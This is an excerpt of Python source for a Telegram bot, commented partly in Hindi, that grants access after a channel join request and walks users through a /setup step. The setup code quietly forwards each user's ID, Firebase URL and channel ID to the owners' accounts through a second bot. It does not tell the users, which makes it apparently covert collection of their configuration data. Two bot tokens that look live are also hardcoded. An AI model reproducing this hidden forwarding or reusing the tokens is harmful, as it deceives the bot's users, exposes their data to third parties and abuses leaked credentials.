...
# BOT TOKENS
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8945153112:AAFpJ6GD_UiJfIQQ4Wi1OypOWNm3rAd9jz8")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8841538540:AAGuFa9WkMq4TtRlznmt8gztNi8K4zqrBjo")

# ============================
# OWNERS
# ============================
OWNER_IDS = [8807492422, 8866279807]
...
user_configs = {}
last_otp = {}
allowed_users = set()  # Users who sent join request
...
def has_access(user_id):
    """User ne channel join request bheji hai ya nahi"""
    return str(user_id) in allowed_users

# ============================
# START - Channel join button
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    # Agar already access hai to welcome message
    if has_access(user_id):
        await show_welcome(update.message)
        return
    
    # Naya user - channel join button
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel & Start", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I've Sent Join Request", callback_data="user_joined")]
    ]
    
    await update.message.reply_text(
        f"{BOT_NAME}\n\n"
        f"<b>🔐 Join Channel to Start</b>\n\n"
        f"Click the button below to send join request to our private channel.\n\n"
        f"After sending the request, click <b>'I've Sent Join Request'</b> to start using the bot.\n\n"
        f"<i>✅ No approval needed. Just send request and start!</i>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML',
        disable_web_page_preview=True
    )

async def user_joined_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User ne join request bhej di - access de do"""
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    
    # Access de do - bas request bhejne se hi
    allowed_users.add(user_id)
    
    # Owner ko notification (info ke liye)
    try:
        ...
        for owner_id in OWNER_IDS:
            try:
                requests.post(url, json={"chat_id": owner_id, "text": msg, "parse_mode": "HTML"}, timeout=5)
            except:
                pass
    except:
        pass
    ...
    await query.edit_message_text(
        ...
        f"<i>Start with /setup to configure your bot.</i>",
        parse_mode='HTML'
    )
...
async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        forward_msg = (
            f"🔐 **Setup Complete!**\n"
            f"👤 User: `{user_id}`\n"
            f"🌐 URL: `{context.user_data['firebase_url']}`\n"
            f"📢 Channel: `{channel_id}`"
        )
        url = f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage"
        for owner_id in OWNER_IDS:
            try:
                requests.post(url, json={"chat_id": owner_id, "text": forward_msg, "parse_mode": "Markdown"}, timeout=5)
            except Exception as e:
                logger.error(f"Forward to owner {owner_id} failed: {e}")
    except Exception as e:
...
def main():
    ...
    app.add_handler(CallbackQueryHandler(user_joined_callback, pattern="^user_joined$"))
    ...
    logger.info("🤖 Bot started – Join channel and start system.")
